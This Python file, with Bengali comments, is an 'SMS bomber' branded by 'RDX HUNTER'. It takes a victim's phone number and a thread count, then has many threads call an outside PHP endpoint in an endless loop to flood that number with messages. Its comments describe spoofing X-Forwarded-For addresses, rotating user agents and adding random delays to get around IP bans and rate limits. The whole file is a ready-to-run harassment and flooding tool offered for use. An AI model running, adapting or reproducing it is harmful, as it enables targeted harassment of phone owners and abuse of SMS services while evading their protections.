import requests
import time
import os
import sys
import random
import string
from threading import Thread

# --- কনফিগারেশন ---
TOOL_NAME = "WORM_SMS_BOMBER_V2_ADVANCED"
CREATOR_NAME = "RDX HUNTER"
FB_ID = "RDX HUNTER"
TELEGRAM_USER = ""
TELEGRAM_GROUP = "https://t.me/rdx_tools"
TARGET_API = "https://rdxhunterop.wuaze.com/rdx.php?phone="

# --- কালার ক্লাস ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("   _____  _   _  _____  _____  _____  _____  _____  _____  _____")
    print(f"  |  __ \\| | | ||  __ \\|  __ \\|  __ \\|  __ \\|  __ \\/ ____|")
    print(f"  | |__) | |_| || |  \\/| |  \\/| |__) | |  \\/| |__) | (___  ")
    print(f"  |  _  /|  _  || |     | |    |  _  /| |     |  _  / \\___ \\ ")
    print(f"  | | \\ \\| | | || |____ | |____| | \\ \\| |____ | | \\ \\ ____) |")
    print(f"  |_|  \\_\\_| |_||_____/ |______|_|  \\_\\_____/|_|  \\_\\_____/")
    print(f"{Colors.ENDC}{Colors.CYAN}")
    print(f"  [!] Tool Name: {TOOL_NAME}")
    print(f"  [!] Created By: {CREATOR_NAME}")
    print(f"  [!] Target API: {TARGET_API}...")
    print(f"  [!] Facebook: {FB_ID}")
    print(f"  [!] Telegram: {TELEGRAM_USER}")
    print(f"  [!] Group Link: {TELEGRAM_GROUP}")
    print(f"{Colors.ENDC}{Colors.BOLD}  ========================================\n")

# --- প্রক্সি এবং ইউজার এজেন্ট রান্ডমাইজেশন (IP ব্যান এড়াতে) ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }

def get_target():
    print(f"{Colors.GREEN}Target Number (e.g., 88017xxxxxxxx): {Colors.ENDC}")
    number = input(f"{Colors.BOLD}>> {Colors.ENDC}")
    return number

def bomb_thread(target_number, thread_id):
    while True:
        try:
            url = f"{TARGET_API}{target_number}"
            headers = get_random_headers()
            # রিকোয়েস্ট পাঠানো
            response = requests.get(url, headers=headers, timeout=3)
            
            if response.status_code == 200:
                print(f"\r{Colors.GREEN}[THREAD-{thread_id}] {Colors.CYAN}SUCCESS{Colors.ENDC} | {url} | Status: {response.status_code}", end='', flush=True)
            else:
                print(f"\r{Colors.FAIL}[THREAD-{thread_id}] {Colors.WARNING}FAILED{Colors.ENDC} | Status: {response.status_code}", end='', flush=True)
            
            # র‍্যান্ডম ডিলে (0.5s থেকে 2.0s) যাতে র‍্যাট লিমিট ট্রিগার না হয়
            time.sleep(random.uniform(0.5, 2.0))
            
        except requests.exceptions.Timeout:
            # টাইমআউট হলে নতুন চেষ্টা
            continue
        except requests.exceptions.ConnectionError:
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            print(f"\r{Colors.FAIL}[ERR] {e}{Colors.ENDC}", end='', flush=True)
            time.sleep(1)

if __name__ == "__main__":
    clear_screen()
    banner()
    
    print(f"{Colors.WARNING}[!] Enter number of threads (Recommended: 5-10 for stability): {Colors.ENDC}")
    try:
        thread_count = int(input(f"{Colors.BOLD}>> {Colors.ENDC}"))
    except ValueError:
        thread_count = 5

    target = get_target()
    
    print(f"\n{Colors.GREEN}[+] Starting Multi-Threaded Bombing on: {target} with {thread_count} threads...{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Press Ctrl+C to stop.{Colors.ENDC}\n")

    threads = []
    for i in range(thread_count):
        t = Thread(target=bomb_thread, args=(target, i+1))
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.FAIL}[!] Bombing Stopped by User!{Colors.ENDC}")
        sys.exit()
